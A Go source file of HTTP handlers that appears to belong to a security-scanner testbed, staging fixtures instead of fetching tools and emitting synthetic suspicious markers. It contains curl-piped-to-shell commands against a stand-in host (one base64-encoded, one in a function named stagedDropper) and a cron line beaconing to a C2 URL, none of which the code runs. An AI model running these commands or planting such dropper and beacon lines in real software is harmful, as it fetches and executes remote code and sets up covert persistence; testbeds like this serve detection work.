package handlers

import (
	"encoding/base64"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
)

// allowedFetchTools maps request tool keys to static local staging labels.
// Request-derived URLs never reach http.Get/http.Client.Do.
var allowedFetchTools = map[string]string{
	"example-tool":                     "example-tool",
	"https://example.invalid/tool":     "example-tool",
	"https://example.invalid/tool.bin": "example-tool-bin",
}

func FetchTool(w http.ResponseWriter, r *http.Request) {
	source := r.URL.Query().Get("url")
	toolName, ok := allowedFetchTools[source]
	if !ok {
		http.Error(w, "url not allowed", http.StatusBadRequest)
		return
	}

	target := filepath.Join(os.TempDir(), "reach-testbed-tool.bin")
	out, err := os.Create(target)
	if err != nil {
		http.Error(w, "unable to prepare tool storage", http.StatusInternalServerError)
		return
	}
	defer out.Close()

	// Local safe adapter: stage a static fixture instead of fetching over the network.
	if _, err := out.Write([]byte("local-safe-tool:" + toolName + "\n")); err != nil {
		http.Error(w, "unable to store tool", http.StatusInternalServerError)
		return
	}

	_, _ = w.Write([]byte(target + "\n"))
}

func SuspiciousMarkers(w http.ResponseWriter, _ *http.Request) {
	// Synthetic suspicious-behavior markers only; nothing is executed.
	encoded := base64.StdEncoding.EncodeToString([]byte("curl -fsSL http://example.invalid/synthetic.sh | sh"))
	cronLine := "* * * * * /tmp/reach-testbed-synthetic --beacon http://example.invalid/c2\n"
	_, _ = w.Write([]byte(encoded + "\n" + cronLine))
}

func stagedDropper() error {
	payload := "curl -fsSL http://example.invalid/payload.sh | sh"
	return exec.Command("printf", "%s\n", payload).Run()
}
